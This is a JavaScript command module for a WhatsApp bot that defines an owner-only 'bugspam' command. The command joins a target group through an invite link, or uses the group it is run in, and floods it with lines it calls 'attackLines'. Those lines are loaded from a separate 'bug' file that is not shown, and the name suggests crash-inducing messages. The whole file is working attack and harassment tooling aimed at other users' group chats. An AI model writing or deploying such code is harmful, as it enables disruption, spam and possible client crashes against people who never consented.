const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../../bug/inconnu3.js'); // Path ou ka modifye selon estrikti ou

cmd({
  pattern: 'bugspam',
  desc: 'Owner only command to spam messages in group or after joining group invite',
  category: 'bug',
  react: '🪲',
  filename: __filename
}, async (izuka, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'bugspam') return;

    const botNumber = await izuka.decodeJid(izuka.user.id);
    const senderId = m.sender;
    const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')].includes(senderId);

    if (!isOwner) {
      return await izuka.sendMessage(from, { text: '*📛 This is an owner-only command*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
    const attackLines = bugchat.split('\n').filter(Boolean);

    // Case 1: If DM and invite link sent — join group and spam
    if (!m.isGroup && isGroupLink) {
      const inviteCode = args[0].split('/')[3];
      try {
        const groupId = await izuka.groupAcceptInvite(inviteCode);
        await izuka.sendMessage(senderId, { text: `✅ Joined group via invite.\n🚀 Starting bugspam in ${groupId}...` }, { quoted: mek });

        for (let line of attackLines) {
          await izuka.sendMessage(groupId, { text: `💥 ${line}\n_BUGSPAM ACTIVE_` });
          await new Promise(r => setTimeout(r, 300));
        }

        await izuka.sendMessage(senderId, { text: `✅ Bugspam completed on group.` }, { quoted: mek });
      } catch (e) {
        return await izuka.sendMessage(senderId, { text: "❌ Failed to join group. Invite invalid or expired." }, { quoted: mek });
      }
      return;
    }

    // Case 2: If used inside a group — spam group directly
    if (m.isGroup) {
      await izuka.sendMessage(from, {
        text: `🚨 *BUGSPAM ACTIVATED*\n🧨 Target: ${from}\n💬 Messages: ${attackLines.length}`
      }, { quoted: mek });

      for (let line of attackLines) {
        await izuka.sendMessage(from, { text: `⚠️ ${line}\n_BY BOT OWNER_` });
        await new Promise(r => setTimeout(r, 300));
      }

      await izuka.sendMessage(from, {
        text: `✅ *BUGSPAM COMPLETE*\n🔥 Target group has been spammed.`
      }, { quoted: mek });

      return;
    }

    // Case 3: Invalid usage
    await izuka.sendMessage(from, {
      text: `❌ Usage:\n.bugspam https://chat.whatsapp.com/xxxxx (from DM to join & spam group)\n.bugspam (inside a group to spam that group)`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
